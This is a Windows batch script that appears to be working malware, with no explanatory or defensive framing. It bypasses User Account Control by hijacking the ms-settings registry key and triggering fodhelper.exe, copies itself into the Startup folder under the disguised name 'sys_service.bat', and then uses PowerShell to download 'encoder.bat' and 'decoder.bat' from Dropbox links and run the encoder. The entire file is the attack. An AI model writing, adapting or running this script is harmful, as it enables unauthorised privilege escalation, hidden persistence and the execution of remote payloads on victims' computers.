@echo off
set "reg_path=HKCU\Software\Classes\ms-settings\Shell\Open\command"

:: --- STEP 1: Check if we are already Admin ---
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [+] Already Admin! Skipping escalation.
    goto :payload
)

:: --- STEP 2: Escalation (only if not Admin) ---
echo [*] Attempting UAC Bypass...
reg add "%reg_path%" /v "DelegateExecute" /t REG_SZ /d "" /f >nul
reg add "%reg_path%" /v "" /t REG_SZ /d "cmd.exe /c %~s0" /f >nul

:: Trigger fodhelper once
start /min fodhelper.exe

:: Wait a moment for the new window to open, then close this one
timeout /t 2 >nul
exit /B

:: --- STEP 3: The actual work (runs in the Admin window) ---
:payload
echo [+] Persistence and Download phase started...

:: Cleanup the registry hijack so we don't loop next time
reg delete "HKCU\Software\Classes\ms-settings" /f >nul

:: Persistence
copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sys_service.bat" >nul

:: Download (Ensure these links are direct download links)
powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/o2kp3013bm6jbeomi4rk6/encoder.bat?rlkey=xjv2zm6vw02l4fwyv4jfmdtco&st=dyl8pw2y&dl=1' -OutFile '%USERPROFILE%\Downloads\encoder.bat'"
powershell -Command "Invoke-WebRequest 'https://www.dropbox.com/scl/fi/hb90ow03dngyvi3pxfj8d/decoder.bat?rlkey=wzrj7ufd8aokupy0txbzm4fvs&st=gyhfiewm&dl=1' -OutFile '%USERPROFILE%\Desktop\decoder.bat'"

echo [+] Executing Encoder...
start "" "%USERPROFILE%\Downloads\encoder.bat"
exit